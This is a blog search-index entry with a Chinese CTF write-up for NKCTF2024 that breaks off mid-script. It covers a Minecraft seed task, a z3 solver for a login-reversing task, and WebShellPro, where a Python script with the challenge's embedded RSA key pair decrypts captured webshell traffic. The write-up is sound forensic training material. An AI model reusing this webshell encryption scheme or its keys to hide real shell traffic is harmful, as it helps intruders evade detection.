<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NKCTF2024个人Wp</title>
      <link href="/2024/03/24/NKCTF2024%E4%B8%AA%E4%BA%BAWp/"/>
      <url>/2024/03/24/NKCTF2024%E4%B8%AA%E4%BA%BAWp/</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="minecraftseed"><a class="markdownIt-Anchor" href="#minecraftseed"></a> MineCraft:Seed</h2><p>这个题就是根据Minecraft服务器的地图逆推出地图种子，直接下载mod:seedcrackerx跑跑图就出了</p><h2 id="webshellpro"><a class="markdownIt-Anchor" href="#webshellpro"></a> WebShellPro</h2><p>套娃题，用wireshark进行流量分析，解密多个http的响应体可以找到部分信息，然后在第9次解密密文后发现关键文件是一个hint.py的代码这个就是shell的加密方式，还有一个关键就是找到了一个Password: Password-based-encryption</p><p>稍微修改一下函数，把所有的shell信息给解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token keyword">import</span> libnum<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSApubkey <span class="token operator">=</span> <span class="token triple-quoted-string string">"""-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----"""</span>prikey <span class="token operator">=</span> <span class="token triple-quoted-string string">"""-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----"""</span>pubkey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span>prikey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>prikey<span class="token punctuation">)</span>n <span class="token operator">=</span> pubkey<span class="token punctuation">.</span>n<span class="token keyword">def</span> <span class="token function">enc_replace</span><span class="token punctuation">(</span>base64_str<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base64_str <span class="token operator">=</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM"</span><span class="token punctuation">)</span>    base64_str <span class="token operator">=</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dec_replace</span><span class="token punctuation">(</span>base64_str<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base64_str <span class="token operator">=</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span>    base64_str <span class="token operator">=</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2"</span><span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 私钥加密</span>    cipher_text <span class="token operator">=</span> <span class="token string">b""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        part <span class="token operator">=</span> plain_text<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">]</span>        enc <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>part<span class="token punctuation">)</span><span class="token punctuation">,</span> prikey<span class="token punctuation">.</span>d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>        cipher_text <span class="token operator">+=</span> enc    <span class="token keyword">return</span> enc_replace<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher_text<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">:</span>    cipher_text<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>dec_replace<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span>    plain_text<span class="token operator">=</span><span class="token string">b""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher_text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        part<span class="token operator">=</span>cipher_text<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">]</span>        dec <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>part<span class="token punctuation">)</span><span class="token punctuation">,</span> pubkey<span class="token punctuation">.</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>        plain_text <span class="token operator">+=</span> dec    <span class="token keyword">return</span> plain_text<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'FZtON9qcMwGMAVjK63BZyUElFGNTMqs1An6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wyn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8We5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMCBo43nSXSPiaGRZfiirk1SiEUPA6HrkDe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeM04aEJn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WzlkHZgRLSlR5S7xBNESbzHmpKVChcFKHM9viQtOxgEwlZFmhEWAMTurszdfL8pmxokQiavn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WBJDNVULWCn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W36n6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WqYvUBqwjn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WEcJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'LGKL544jKbSMPaweF1FkEe5Iykv8lnzI5AN7O0rLbFOic5mOKYn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WtSYvYOySDLiYzPjGiPTM4RhX2stGfxElRHj0g2aSxLjj8IsUMrZ6uxvDwgCZlKB7o1r0xqOyru9n6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WJu1bRhbAXiHNuZ1MnlPhcgLyfk9FCNewiLM4FTwy2KywJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'JfswXTSuox0IP5NsGTln6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WAUNIsFC7XuybsDorWNCNJe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMn3qEUNcgn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WihMfwF6XsGOSKCqFGezqHFTO5q6VG4EDWe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeM4Htglmtq4BmcZJKgXLvzkzA0nTFnBVP5c6zT0WX7raTEWe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMK20o5eoe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMuPXOMyPlgMQbAR9ZMp2Olwe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMvbaR1NJgJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'XFQS9n5xr9QWKewe6dw46Lmi928e5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMVmHGrQmIMTvQJr7DW6SQZLMMxCyuYMYedXzrfNxkELMX1CXl7GElxC4olcozqWnUos9IE6kSwn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WsSk2rukyrXnbnQh27ekOLf6epWfpgMmr9BKF1XXUb20pJP5fagwhxpqSeuuwAefk8UelUJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'drt4OBTcetIurMrmriIxPhfWx5nFc2grsMhpGA8SkKTeTs4dk3UIxfphRun6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WckPvlpAn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WIunRMOHD1sHFhcjCin6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WsWxLkyKFS9IdjEZHHn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W72bnhzZRzRcg3RLHn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wwpe2zS5fHA4u1Wn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wgb0JGW0sWgb9I5lQXTXde5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMqR0CUyxqgeKNMAwJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'co7xLpHsVEAE5l7fsCb7VwK2NiPtkINUh7sNre5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMNhhn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W3RkS5n6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wxa7OyiwyiB8jSnEVIGX2lYKa50q5YI23J5ppkhcohr0ktrcWn91MXrTV0Vq5JW6yPbItn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WbuBfQXNpYspLKV5Tljge4YWoHDQqiKCYYnPMF7LagcC9fsQffwrMSsJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'GwFlhxRoksXdDJWaDEfySWGbRQ1SBeoX0r2lwvLePqSnZw1N75wS0sn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WONPr1c54e5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMofPeg2CsSq0UXnNHJhPuN2VpcMn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8We5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMUTJSBr3qLmR6iNe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMKKxI6ry0CDf7SdaP1pXu8SDYeAWAuCv9xeegfRhkZt9pvXy40cNskiNM1FW7FPnEJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'IbNEZ8rGERCl3pZe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMrpWBqzS1NIM0CdISg8PUUBzhqYkr5s5fn2Pdn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WSeOqGaU8GJRe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMNRlRbjXHUEEOi3vbuC52jB8LrgcnrZfFFRLtwxox91C5mXwSP6PhM3pQmsFPusKCyYP3OOIbzUa8MGqBo9OjaTxP4lVPrIBkwGcQPqqvwJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'QO0aRn91LW114FkdPXtsz2NXBxffsluGfLkss87RnMen6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WOM0SdYBMemkKsJ5C406Izn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WPXn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W2mC19qS0mJvPfBNMH0Vl6w72Ie5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeM20nFUokf6XNMLkq5TuvyVgjCUCZcCERF1gTAZn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W80qMkO0VJxTqdrIc1H5MmMJpAlU2XfYRBCF5kUJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'OTEBXOzklq47vCMun6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WvSDL2h4svC0e5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMoTkLcpmoy0HSto3GoNNT7v86XmkKmXJL0JfzvyZNjgriP7PURYREU35lTsqKxTqvFhmn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W5n6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W9BksBYFqdnX4HS6MMTyS44ZNjbcn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W1jlNLvHmn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WXABbE6xihToCzcCwQPR39dVasnlr2AREUmIJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'co7xLpHsVEAE5l7fsCb7VwK2NiPtkINUh7sNre5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMNhhn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W3RkS5n6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wxa7OyiwyiB8jSnEVIGX2lYKa50q5YI23J5ppkhcohr0ktrcWn91MXrTV0Vq5JW6yPbItn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WbuBfQXNpYspLKV5Tljge4YWoHDQqiKCYYnPMF7LagcC9fsQffwrMSsJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>        <span class="token string">'MHtJ35fx5m9ivoQn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WlNuFPx5uX222VNnKK1unlEiItzrWt8e5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMlxF0fw1PosQyCsZaEctarlArKDMe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMlw6LxXKNp7koEMW3IPya8k71L8t7AoFcH67huo9MdqWnOIwzC4KrGje5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMrgNn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WG9DQ8GYZaDFqjle5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMBmTpbKz7XWXin6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WgVtbcB2skJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        text<span class="token operator">=</span>decrypt<span class="token punctuation">(</span>unquote<span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'解密数据为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token comment"># Password-based-encryption   This is key</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到有一条解密数据为echo U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ== &gt; /root/FLAG/flag.txt</p><p>U2FsdGVKX1 是对称加密头，AES之类的，然后把key填进去试一下就出了</p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="system_login"><a class="markdownIt-Anchor" href="#system_login"></a> System_login</h2><p>密码的加密逻辑没看懂，前半段是异或，后半段感觉是AES，但是Sbox好像修改了</p><p>账号的加密逻辑很简单就是一个约束方程求解，直接z3一把梭</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#先求出username</span><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 创建一个新的Z3求解器</span>solver <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 创建16个整数变量a1[0]到a1[15]</span>a1 <span class="token operator">=</span> <span class="token punctuation">[</span>Int<span class="token punctuation">(</span><span class="token string">'a1[%d]'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># 添加所有的约束条件</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">447</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">101</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12265</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2000</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">88</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">87</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">21475</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">7896</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">443</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">200</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">33774</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">556</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">333</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">44758</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">202</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">9950</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">89</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">24052</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">91</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">25209</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">111</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">654</span> <span class="token 